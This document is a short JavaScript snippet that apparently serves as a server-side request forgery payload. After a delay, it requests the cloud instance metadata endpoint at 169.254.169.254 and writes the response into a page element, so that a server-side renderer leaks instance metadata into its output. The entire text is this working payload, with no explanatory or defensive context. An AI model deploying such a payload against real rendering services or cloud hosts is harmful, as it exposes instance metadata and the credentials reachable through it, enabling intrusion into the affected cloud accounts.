setTimeout(function(){
  var r=document.getElementById('out');
  var x=new XMLHttpRequest();
  x.open('GET','http://169.254.169.254/latest/meta-data/',false);
  try{x.send();r.textContent='IMDS:'+x.responseText;}
  catch(e){r.textContent='IMDS_ERR:'+e.message;}
},2500);
